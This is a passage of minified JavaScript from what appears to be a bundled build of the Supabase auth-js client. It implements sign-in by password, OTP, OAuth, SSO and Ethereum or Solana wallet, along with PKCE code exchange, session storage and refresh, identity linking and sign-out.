0?s:{},channel:(a=v?.channel)!==null&&a!==void 0?a:"sms",gotrue_meta_security:{captcha_token:v?.captchaToken}},xform:qt})}else throw new Zo("You must provide either an email or phone number and a password");const{data:c,error:d}=l;if(d||!c)return{data:{user:null,session:null},error:d};const p=c.session,f=c.user;return c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(l){if(oe(l))return{data:{user:null,session:null},error:l};throw l}}async signInWithPassword(e){try{let r;if("email"in e){const{email:l,password:c,options:d}=e;r=await de(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:l,password:c,gotrue_meta_security:{captcha_token:d?.captchaToken}},xform:Zg})}else if("phone"in e){const{phone:l,password:c,options:d}=e;r=await de(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:l,password:c,gotrue_meta_security:{captcha_token:d?.captchaToken}},xform:Zg})}else throw new Zo("You must provide either an email or phone number and a password");const{data:s,error:a}=r;return a?{data:{user:null,session:null},error:a}:!s||!s.session||!s.user?{data:{user:null,session:null},error:new ii}:(s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",s.session)),{data:Object.assign({user:s.user,session:s.session},s.weak_password?{weakPassword:s.weak_password}:null),error:a})}catch(r){if(oe(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOAuth(e){var r,s,a,l;return await this._handleProviderSignIn(e.provider,{redirectTo:(r=e.options)===null||r===void 0?void 0:r.redirectTo,scopes:(s=e.options)===null||s===void 0?void 0:s.scopes,queryParams:(a=e.options)===null||a===void 0?void 0:a.queryParams,skipBrowserRedirect:(l=e.options)===null||l===void 0?void 0:l.skipBrowserRedirect})}async exchangeCodeForSession(e){return await this.initializePromise,this._acquireLock(-1,async()=>this._exchangeCodeForSession(e))}async signInWithWeb3(e){const{chain:r}=e;switch(r){case"ethereum":return await this.signInWithEthereum(e);case"solana":return await this.signInWithSolana(e);default:throw new Error(`@supabase/auth-js: Unsupported chain "${r}"`)}}async signInWithEthereum(e){var r,s,a,l,c,d,p,f,m,y,v;let w,A;if("message"in e)w=e.message,A=e.signature;else{const{chain:k,wallet:x,statement:B,options:_}=e;let P;if(Ct())if(typeof x=="object")P=x;else{const ee=window;if("ethereum"in ee&&typeof ee.ethereum=="object"&&"request"in ee.ethereum&&typeof ee.ethereum.request=="function")P=ee.ethereum;else throw new Error("@supabase/auth-js: No compatible Ethereum wallet interface on the window object (window.ethereum) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'ethereum', wallet: resolvedUserWallet }) instead.")}else{if(typeof x!="object"||!_?.url)throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");P=x}const M=new URL((r=_?.url)!==null&&r!==void 0?r:window.location.href),V=await P.request({method:"eth_requestAccounts"}).then(ee=>ee).catch(()=>{throw new Error("@supabase/auth-js: Wallet method eth_requestAccounts is missing or invalid")});if(!V||V.length===0)throw new Error("@supabase/auth-js: No accounts available. Please ensure the wallet is connected.");const U=zb(V[0]);let W=(s=_?.signInWithEthereum)===null||s===void 0?void 0:s.chainId;if(!W){const ee=await P.request({method:"eth_chainId"});W=pC(ee)}const G={domain:M.host,address:U,statement:B,uri:M.href,version:"1",chainId:W,nonce:(a=_?.signInWithEthereum)===null||a===void 0?void 0:a.nonce,issuedAt:(c=(l=_?.signInWithEthereum)===null||l===void 0?void 0:l.issuedAt)!==null&&c!==void 0?c:new Date,expirationTime:(d=_?.signInWithEthereum)===null||d===void 0?void 0:d.expirationTime,notBefore:(p=_?.signInWithEthereum)===null||p===void 0?void 0:p.notBefore,requestId:(f=_?.signInWithEthereum)===null||f===void 0?void 0:f.requestId,resources:(m=_?.signInWithEthereum)===null||m===void 0?void 0:m.resources};w=gC(G),A=await P.request({method:"personal_sign",params:[fC(w),U]})}try{const{data:k,error:x}=await de(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"ethereum",message:w,signature:A},!((y=e.options)===null||y===void 0)&&y.captchaToken?{gotrue_meta_security:{captcha_token:(v=e.options)===null||v===void 0?void 0:v.captchaToken}}:null),xform:qt});if(x)throw x;return!k||!k.session||!k.user?{data:{user:null,session:null},error:new ii}:(k.session&&(await this._saveSession(k.session),await this._notifyAllSubscribers("SIGNED_IN",k.session)),{data:Object.assign({},k),error:x})}catch(k){if(oe(k))return{data:{user:null,session:null},error:k};throw k}}async signInWithSolana(e){var r,s,a,l,c,d,p,f,m,y,v,w;let A,k;if("message"in e)A=e.message,k=e.signature;else{const{chain:x,wallet:B,statement:_,options:P}=e;let M;if(Ct())if(typeof B=="object")M=B;else{const U=window;if("solana"in U&&typeof U.solana=="object"&&("signIn"in U.solana&&typeof U.solana.signIn=="function"||"signMessage"in U.solana&&typeof U.solana.signMessage=="function"))M=U.solana;else throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.")}else{if(typeof B!="object"||!P?.url)throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");M=B}const V=new URL((r=P?.url)!==null&&r!==void 0?r:window.location.href);if("signIn"in M&&M.signIn){const U=await M.signIn(Object.assign(Object.assign(Object.assign({issuedAt:new Date().toISOString()},P?.signInWithSolana),{version:"1",domain:V.host,uri:V.href}),_?{statement:_}:null));let W;if(Array.isArray(U)&&U[0]&&typeof U[0]=="object")W=U[0];else if(U&&typeof U=="object"&&"signedMessage"in U&&"signature"in U)W=U;else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");if("signedMessage"in W&&"signature"in W&&(typeof W.signedMessage=="string"||W.signedMessage instanceof Uint8Array)&&W.signature instanceof Uint8Array)A=typeof W.signedMessage=="string"?W.signedMessage:new TextDecoder().decode(W.signedMessage),k=W.signature;else throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields")}else{if(!("signMessage"in M)||typeof M.signMessage!="function"||!("publicKey"in M)||typeof M!="object"||!M.publicKey||!("toBase58"in M.publicKey)||typeof M.publicKey.toBase58!="function")throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");A=[`${V.host} wants you to sign in with your Solana account:`,M.publicKey.toBase58(),..._?["",_,""]:[""],"Version: 1",`URI: ${V.href}`,`Issued At: ${(a=(s=P?.signInWithSolana)===null||s===void 0?void 0:s.issuedAt)!==null&&a!==void 0?a:new Date().toISOString()}`,...!((l=P?.signInWithSolana)===null||l===void 0)&&l.notBefore?[`Not Before: ${P.signInWithSolana.notBefore}`]:[],...!((c=P?.signInWithSolana)===null||c===void 0)&&c.expirationTime?[`Expiration Time: ${P.signInWithSolana.expirationTime}`]:[],...!((d=P?.signInWithSolana)===null||d===void 0)&&d.chainId?[`Chain ID: ${P.signInWithSolana.chainId}`]:[],...!((p=P?.signInWithSolana)===null||p===void 0)&&p.nonce?[`Nonce: ${P.signInWithSolana.nonce}`]:[],...!((f=P?.signInWithSolana)===null||f===void 0)&&f.requestId?[`Request ID: ${P.signInWithSolana.requestId}`]:[],...!((y=(m=P?.signInWithSolana)===null||m===void 0?void 0:m.resources)===null||y===void 0)&&y.length?["Resources",...P.signInWithSolana.resources.map(W=>`- ${W}`)]:[]].join(`
`);const U=await M.signMessage(new TextEncoder().encode(A),"utf8");if(!U||!(U instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");k=U}}try{const{data:x,error:B}=await de(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"solana",message:A,signature:vr(k)},!((v=e.options)===null||v===void 0)&&v.captchaToken?{gotrue_meta_security:{captcha_token:(w=e.options)===null||w===void 0?void 0:w.captchaToken}}:null),xform:qt});if(B)throw B;return!x||!x.session||!x.user?{data:{user:null,session:null},error:new ii}:(x.session&&(await this._saveSession(x.session),await this._notifyAllSubscribers("SIGNED_IN",x.session)),{data:Object.assign({},x),error:B})}catch(x){if(oe(x))return{data:{user:null,session:null},error:x};throw x}}async _exchangeCodeForSession(e){const r=await ur(this.storage,`${this.storageKey}-code-verifier`),[s,a]=(r??"").split("/");try{const{data:l,error:c}=await de(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:e,code_verifier:s},xform:qt});if(await Ln(this.storage,`${this.storageKey}-code-verifier`),c)throw c;return!l||!l.session||!l.user?{data:{user:null,session:null,redirectType:null},error:new ii}:(l.session&&(await this._saveSession(l.session),await this._notifyAllSubscribers("SIGNED_IN",l.session)),{data:Object.assign(Object.assign({},l),{redirectType:a??null}),error:c})}catch(l){if(oe(l))return{data:{user:null,session:null,redirectType:null},error:l};throw l}}async signInWithIdToken(e){try{const{options:r,provider:s,token:a,access_token:l,nonce:c}=e,d=await de(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:s,id_token:a,access_token:l,nonce:c,gotrue_meta_security:{captcha_token:r?.captchaToken}},xform:qt}),{data:p,error:f}=d;return f?{data:{user:null,session:null},error:f}:!p||!p.session||!p.user?{data:{user:null,session:null},error:new ii}:(p.session&&(await this._saveSession(p.session),await this._notifyAllSubscribers("SIGNED_IN",p.session)),{data:p,error:f})}catch(r){if(oe(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOtp(e){var r,s,a,l,c;try{if("email"in e){const{email:d,options:p}=e;let f=null,m=null;this.flowType==="pkce"&&([f,m]=await si(this.storage,this.storageKey));const{error:y}=await de(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:d,data:(r=p?.data)!==null&&r!==void 0?r:{},create_user:(s=p?.shouldCreateUser)!==null&&s!==void 0?s:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},code_challenge:f,code_challenge_method:m},redirectTo:p?.emailRedirectTo});return{data:{user:null,session:null},error:y}}if("phone"in e){const{phone:d,options:p}=e,{data:f,error:m}=await de(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:d,data:(a=p?.data)!==null&&a!==void 0?a:{},create_user:(l=p?.shouldCreateUser)!==null&&l!==void 0?l:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},channel:(c=p?.channel)!==null&&c!==void 0?c:"sms"}});return{data:{user:null,session:null,messageId:f?.message_id},error:m}}throw new Zo("You must provide either an email or phone number.")}catch(d){if(oe(d))return{data:{user:null,session:null},error:d};throw d}}async verifyOtp(e){var r,s;try{let a,l;"options"in e&&(a=(r=e.options)===null||r===void 0?void 0:r.redirectTo,l=(s=e.options)===null||s===void 0?void 0:s.captchaToken);const{data:c,error:d}=await de(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},e),{gotrue_meta_security:{captcha_token:l}}),redirectTo:a,xform:qt});if(d)throw d;if(!c)throw new Error("An error occurred on token verification.");const p=c.session,f=c.user;return p?.access_token&&(await this._saveSession(p),await this._notifyAllSubscribers(e.type=="recovery"?"PASSWORD_RECOVERY":"SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(a){if(oe(a))return{data:{user:null,session:null},error:a};throw a}}async signInWithSSO(e){var r,s,a;try{let l=null,c=null;return this.flowType==="pkce"&&([l,c]=await si(this.storage,this.storageKey)),await de(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in e?{provider_id:e.providerId}:null),"domain"in e?{domain:e.domain}:null),{redirect_to:(s=(r=e.options)===null||r===void 0?void 0:r.redirectTo)!==null&&s!==void 0?s:void 0}),!((a=e?.options)===null||a===void 0)&&a.captchaToken?{gotrue_meta_security:{captcha_token:e.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:l,code_challenge_method:c}),headers:this.headers,xform:sC})}catch(l){if(oe(l))return{data:null,error:l};throw l}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async e=>{const{data:{session:r},error:s}=e;if(s)throw s;if(!r)throw new Un;const{error:a}=await de(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:r.access_token});return{data:{user:null,session:null},error:a}})}catch(e){if(oe(e))return{data:{user:null,session:null},error:e};throw e}}async resend(e){try{const r=`${this.url}/resend`;if("email"in e){const{email:s,type:a,options:l}=e,{error:c}=await de(this.fetch,"POST",r,{headers:this.headers,body:{email:s,type:a,gotrue_meta_security:{captcha_token:l?.captchaToken}},redirectTo:l?.emailRedirectTo});return{data:{user:null,session:null},error:c}}else if("phone"in e){const{phone:s,type:a,options:l}=e,{data:c,error:d}=await de(this.fetch,"POST",r,{headers:this.headers,body:{phone:s,type:a,gotrue_meta_security:{captcha_token:l?.captchaToken}}});return{data:{user:null,session:null,messageId:c?.message_id},error:d}}throw new Zo("You must provide either an email or phone number and a type")}catch(r){if(oe(r))return{data:{user:null,session:null},error:r};throw r}}async getSession(){return await this.initializePromise,await this._acquireLock(-1,async()=>this._useSession(async r=>r))}async _acquireLock(e,r){this._debug("#_acquireLock","begin",e);try{if(this.lockAcquired){const s=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),a=(async()=>(await s,await r()))();return this.pendingInLock.push((async()=>{try{await a}catch{}})()),a}return await this.lock(`lock:${this.storageKey}`,e,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const s=r();for(this.pendingInLock.push((async()=>{try{await s}catch{}})()),await s;this.pendingInLock.length;){const a=[...this.pendingInLock];await Promise.all(a),this.pendingInLock.splice(0,a.length)}return await s}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(e){this._debug("#_useSession","begin");try{const r=await this.__loadSession();return await e(r)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let e=null;const r=await ur(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",r),r!==null&&(this._isValidSession(r)?e=r:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!e)return{data:{session:null},error:null};const s=e.expires_at?e.expires_at*1e3-Date.now()<Yc:!1;if(this._debug("#__loadSession()",`session has${s?"":" not"} expired`,"expires_at",e.expires_at),!s){if(this.userStorage){const c=await ur(this.userStorage,this.storageKey+"-user");c?.user?e.user=c.user:e.user=eu()}if(this.storage.isServer&&e.user){let c=this.suppressGetSessionWarning;e=new Proxy(e,{get:(p,f,m)=>(!c&&f==="user"&&(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),c=!0,this.suppressGetSessionWarning=!0),Reflect.get(p,f,m))})}return{data:{session:e},error:null}}const{data:a,error:l}=await this._callRefreshToken(e.refresh_token);return l?{data:{session:null},error:l}:{data:{session:a},error:null}}finally{this._debug("#__loadSession()","end")}}async getUser(e){return e?await this._getUser(e):(await this.initializePromise,await this._acquireLock(-1,async()=>await this._getUser()))}async _getUser(e){try{return e?await de(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:e,xform:Vn}):await this._useSession(async r=>{var s,a,l;const{data:c,error:d}=r;if(d)throw d;return!(!((s=c.session)===null||s===void 0)&&s.access_token)&&!this.hasCustomAuthorizationHeader?{data:{user:null},error:new Un}:await de(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(l=(a=c.session)===null||a===void 0?void 0:a.access_token)!==null&&l!==void 0?l:void 0,xform:Vn})})}catch(r){if(oe(r))return OA(r)&&(await this._removeSession(),await Ln(this.storage,`${this.storageKey}-code-verifier`)),{data:{user:null},error:r};throw r}}async updateUser(e,r={}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._updateUser(e,r))}async _updateUser(e,r={}){try{return await this._useSession(async s=>{const{data:a,error:l}=s;if(l)throw l;if(!a.session)throw new Un;const c=a.session;let d=null,p=null;this.flowType==="pkce"&&e.email!=null&&([d,p]=await si(this.storage,this.storageKey));const{data:f,error:m}=await de(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:r?.emailRedirectTo,body:Object.assign(Object.assign({},e),{code_challenge:d,code_challenge_method:p}),jwt:c.access_token,xform:Vn});if(m)throw m;return c.user=f.user,await this._saveSession(c),await this._notifyAllSubscribers("USER_UPDATED",c),{data:{user:c.user},error:null}})}catch(s){if(oe(s))return{data:{user:null},error:s};throw s}}async setSession(e){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._setSession(e))}async _setSession(e){try{if(!e.access_token||!e.refresh_token)throw new Un;const r=Date.now()/1e3;let s=r,a=!0,l=null;const{payload:c}=Zc(e.access_token);if(c.exp&&(s=c.exp,a=s<=r),a){const{data:d,error:p}=await this._callRefreshToken(e.refresh_token);if(p)return{data:{user:null,session:null},error:p};if(!d)return{data:{user:null,session:null},error:null};l=d}else{const{data:d,error:p}=await this._getUser(e.access_token);if(p)throw p;l={access_token:e.access_token,refresh_token:e.refresh_token,user:d.user,token_type:"bearer",expires_in:s-r,expires_at:s},await this._saveSession(l),await this._notifyAllSubscribers("SIGNED_IN",l)}return{data:{user:l.user,session:l},error:null}}catch(r){if(oe(r))return{data:{session:null,user:null},error:r};throw r}}async refreshSession(e){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._refreshSession(e))}async _refreshSession(e){try{return await this._useSession(async r=>{var s;if(!e){const{data:c,error:d}=r;if(d)throw d;e=(s=c.session)!==null&&s!==void 0?s:void 0}if(!e?.refresh_token)throw new Un;const{data:a,error:l}=await this._callRefreshToken(e.refresh_token);return l?{data:{user:null,session:null},error:l}:a?{data:{user:a.user,session:a},error:null}:{data:{user:null,session:null},error:null}})}catch(r){if(oe(r))return{data:{user:null,session:null},error:r};throw r}}async _getSessionFromURL(e,r){try{if(!Ct())throw new ea("No browser detected.");if(e.error||e.error_description||e.error_code)throw new ea(e.error_description||"Error in URL with unspecified error_description",{error:e.error||"unspecified_error",code:e.error_code||"unspecified_code"});switch(r){case"implicit":if(this.flowType==="pkce")throw new qg("Not a valid PKCE flow url.");break;case"pkce":if(this.flowType==="implicit")throw new ea("Not a valid implicit grant flow url.");break;default:}if(r==="pkce"){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!e.code)throw new qg("No code detected.");const{data:_,error:P}=await this._exchangeCodeForSession(e.code);if(P)throw P;const M=new URL(window.location.href);return M.searchParams.delete("code"),window.history.replaceState(window.history.state,"",M.toString()),{data:{session:_.session,redirectType:null},error:null}}const{provider_token:s,provider_refresh_token:a,access_token:l,refresh_token:c,expires_in:d,expires_at:p,token_type:f}=e;if(!l||!d||!c||!f)throw new ea("No session defined in URL");const m=Math.round(Date.now()/1e3),y=parseInt(d);let v=m+y;p&&(v=parseInt(p));const w=v-m;w*1e3<=ci&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${w}s, should have been closer to ${y}s`);const A=v-y;m-A>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",A,v,m):m-A<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",A,v,m);const{data:k,error:x}=await this._getUser(l);if(x)throw x;const B={provider_token:s,provider_refresh_token:a,access_token:l,expires_in:y,expires_at:v,refresh_token:c,token_type:f,user:k.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),{data:{session:B,redirectType:e.type},error:null}}catch(s){if(oe(s))return{data:{session:null,redirectType:null},error:s};throw s}}_isImplicitGrantCallback(e){return!!(e.access_token||e.error_description)}async _isPKCECallback(e){const r=await ur(this.storage,`${this.storageKey}-code-verifier`);return!!(e.code&&r)}async signOut(e={scope:"global"}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._signOut(e))}async _signOut({scope:e}={scope:"global"}){return await this._useSession(async r=>{var s;const{data:a,error:l}=r;if(l)return{error:l};const c=(s=a.session)===null||s===void 0?void 0:s.access_token;if(c){const{error:d}=await this.admin.signOut(c,e);if(d&&!(DA(d)&&(d.status===404||d.status===401||d.status===403)))return{error:d}}return e!=="others"&&(await this._removeSession(),await Ln(this.storage,`${this.storageKey}-code-verifier`)),{error:null}})}onAuthStateChange(e){const r=zA(),s={id:r,callback:e,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",r),this.stateChangeEmitters.delete(r)}};return this._debug("#onAuthStateChange()","registered callback with id",r),this.stateChangeEmitters.set(r,s),(async()=>(await this.initializePromise,await this._acquireLock(-1,async()=>{this._emitInitialSession(r)})))(),{data:{subscription:s}}}async _emitInitialSession(e){return await this._useSession(async r=>{var s,a;try{const{data:{session:l},error:c}=r;if(c)throw c;await((s=this.stateChangeEmitters.get(e))===null||s===void 0?void 0:s.callback("INITIAL_SESSION",l)),this._debug("INITIAL_SESSION","callback id",e,"session",l)}catch(l){await((a=this.stateChangeEmitters.get(e))===null||a===void 0?void 0:a.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",e,"error",l),console.error(l)}})}async resetPasswordForEmail(e,r={}){let s=null,a=null;this.flowType==="pkce"&&([s,a]=await si(this.storage,this.storageKey,!0));try{return await de(this.fetch,"POST",`${this.url}/recover`,{body:{email:e,code_challenge:s,code_challenge_method:a,gotrue_meta_security:{captcha_token:r.captchaToken}},headers:this.headers,redirectTo:r.redirectTo})}catch(l){if(oe(l))return{data:null,error:l};throw l}}async getUserIdentities(){var e;try{const{data:r,error:s}=await this.getUser();if(s)throw s;return{data:{identities:(e=r.user.identities)!==null&&e!==void 0?e:[]},error:null}}catch(r){if(oe(r))return{data:null,error:r};throw r}}async linkIdentity(e){return"token"in e?this.linkIdentityIdToken(e):this.linkIdentityOAuth(e)}async linkIdentityOAuth(e){var r;try{const{data:s,error:a}=await this._useSession(async l=>{var c,d,p,f,m;const{data:y,error:v}=l;if(v)throw v;const w=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,e.provider,{redirectTo:(c=e.options)===null||c===void 0?void 0:c.redirectTo,scopes:(d=e.options)===null||d===void 0?void 0:d.scopes,queryParams:(p=e.options)===null||p===void 0?void 0:p.queryParams,skipBrowserRedirect:!0});return await de(this.fetch,"GET",w,{headers:this.headers,jwt:(m=(f=y.session)===null||f===void 0?void 0:f.access_token)!==null&&m!==void 0?m:void 0})});if(a)throw a;return Ct()&&!(!((r=e.options)===null||r===void 0)&&r.skipBrowserRedirect)&&window.location.assign(s?.url),{data:{provider:e.provider,url:s?.url},error:null}}catch(s){if(oe(s))return{data:{provider:e.provider,url:null},error:s};throw s}}async linkIdentityIdToken(e){return await this._useSession(async r=>{var s;try{const{error:a,data:{session:l}}=r;if(a)throw a;const{options:c,provider:d,token:p,access_token:f,nonce:m}=e,y=await de(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,jwt:(s=l?.access_token)!==null&&s!==void 0?s:void 0,body:{provider:d,id_token:p,access_token:f,nonce:m,link_identity:!0,gotrue_meta_security:{captcha_token:c?.captchaToken}},xform:qt}),{data:v,error:w}=y;return w?{data:{user:null,session:null},error:w}:!v||!v.session||!v.user?{data:{user:null,session:null},error:new ii}:(v.session&&(await this._saveSession(v.session),await this._notifyAllSubscribers("USER_UPDATED",v.session)),{data:v,error:w})}catch(a){if(oe(a))return{data:{user:null,session:null},error:a};throw a}})}async unlinkIdentity(e){try{return await this._useSession(async r=>{var s,a;const{data:l,error:c}=r;if(c)throw c;return await de(this.fetch,"DELETE",`${this.url}/user/identities/${e.identity_id}`,{headers:this.headers,jwt:(a=(s=l.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _refreshAccessToken(e){const r=`#_refreshAccessToken(${e.substring(0,5)}...)`;this._debug(r,"begin");try{const s=Date.now();return await HA(async a=>(a>0&&await $A(200*Math.pow(2,a-1)),this._debug(r,"refreshing attempt",a),await de(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:e},headers:this.headers,xform:qt})),(a,l)=>{const c=200*Math.pow(2,a);return l&&Xc(l)&&Date.now()+c-s<ci})}catch(s){if(this._debug(r,"error",s),oe(s))return{data:{session:null,user:null},error:s};throw s}finally{this._debug(r,"end")}}_isValidSession(e){return typeof e=="object"&&e!==null&&"access_token"in e&&"refresh_token"in e&&"expires_at"in e}async _handleProviderSignIn(e,r){const s=await this._getUrlForProvider(`${this.url}/authorize`,e,{redirectTo:r.redirectTo,scopes:r.scopes,queryParams:r.queryParams});return this._debug("#_handleProviderSignIn()","provider",e,"options",r,"url",s),Ct()&&!r.skipBrowserRedirect&&window.location.assign(s),{data:{provider:e,url:s},error:null}}async _recoverAndRefresh(){var e,r;const s="#_recoverAndRefresh()";this._debug(s,"begin");try{const a=await ur(this.storage,this.storageKey);if(a&&this.userStorage){let c=await ur(this.userStorage,this.storageKey+"-user");!this.storage.isServer&&Object.is(this.storage,this.userStorage)&&!c&&(c={user:a.user},await ui(this.userStorage,this.storageKey+"-user",c)),a.user=(e=c?.user)!==null&&e!==void 0?e:eu()}else if(a&&!a.user&&!a.user){const c=await ur(this.storage,this.storageKey+"-user");c&&c?.user?(a.user=c.user,await Ln(this.storage,this.storageKey+"-user"),await ui(this.storage,this.storageKey,a)):a.user=eu()}if(this._debug(s,"session from storage",a),!this._isValidSession(a)){this._debug(s,"session is not valid"),a!==null&&await this._removeSession();return}const l=((r=a.expires_at)!==null&&r!==void 0?r:1/0)*1e3-Date.now()<Yc;if(this._debug(s,`session has${l?"":" not"} expired with margin of ${Yc}s`),l){if(this.autoRefreshToken&&a.refresh_token){const{error:c}=await this._callRefreshToken(a.refresh_token);c&&(console.error(c),Xc(c)||(this._debug(s,"refresh failed with a non-retryable error, removing the session",c),await this._removeSession()))}}else if(a.user&&a.user.__isUserNotAvailableProxy===!0)try{const{data:c,error:d}=await this._getUser(a.access_token);!d&&c?.user?(a.user=c.user,await this._saveSession(a),await this._notifyAllSubscribers("SIGNED_IN",a)):this._debug(s,"could not get user data, skipping SIGNED_IN notification")}catch(c){console.error("Error getting user data:",c),this._debug(s,"error getting user data, skipping SIGNED_IN notification",c)}else await this._notifyAllSubscribers("SIGNED_IN",a)}catch(a){this._debug(s,"error",a),console.error(a);return}finally{this._debug(s,"end")}}async _callRefreshToken(e){var r,s;if(!e)throw new Un;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const a=`#_callRefreshToken(${e.substring(0,5)}...)`;this._debug(a,"begin");try{this.refreshingDeferred=new Ra;const{data:l,error:c}=await this._refreshAccessToken(e);if(c)throw c;if(!l.session)throw new Un;await this._saveSession(l.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",l.session);const d={data:l.session,error:null};return this.refreshingDeferred.resolve(d),d}catch(l){if(this._debug(a,"error",l),oe(l)){const c={data:null,error:l};return Xc(l)||await this._removeSession(),(r=this.refreshingDeferred)===null||r===void 0||r.resolve(c),c}throw(s=this.refreshingDeferred)===null||s===void 0||s.reject(l),l}finally{this.refreshingDeferred=null,this._debug(a,"end")}}async _notifyAllSubscribers(e,r,s=!0){const a=`#_notifyAllSubscribers(${e})`;this._debug(a,"begin",r,`broadcast = ${s}`);try{this.broadcastChannel&&s&&this.broadcastChannel.postMessage({event:e,session:r});const l=[],c=Array.from(this.stateChangeEmitters.values()).map(async d=>{try{await d.callback(e,r)}catch(p){l.push(p)}});if(await Promise.all(c),l.length>0){for(let d=0;d<l.length;d+=1)console.error(l[d]);throw l[0]}}finally{this._debug(a,"end")}}async _saveSession(e){this._debug("#_saveSession()",e),this.suppressGetSessionWarning=!0;const r=Object.assign({},e),s=r.user&&r.user.__isUserNotAvailableProxy===!0;if(this.userStorage){!s&&r.user&&await ui(this.userStorage,this.storageKey+"-user",{user:r.user});const a=Object.assign({},r);delete a.user;const l=Yg(a);await ui(this.storage,this.storageKey,l)}else{const a=Yg(r);await ui(this.storage,this.storageKey,a)}}async _removeSession(){this._debug("#_removeSession()"),await Ln(this.storage,this.storageKey),await Ln(this.storage,this.storageKey+"-code-verifier"),await Ln(this.storage,this.storageKey+"-user"),this.userStorage&&await Ln(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const e=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{e&&Ct()&&window?.removeEventListener&&window.removeEventListener("visibilitychange",e)}catch(r){console.error("removing visibilitychange callback failed",r)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const e=setInterval(()=>this._autoRefreshTokenTick(),ci);this.autoRefreshTicker=e,e&&typeof e=="object"&&typeof e.unref=="function"?e.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(e),setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const e=this.autoRefreshTicker;this.autoRefreshTicker=null,e&&clearInterval(e)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const e=Date.now();try{return await this._useSession(async 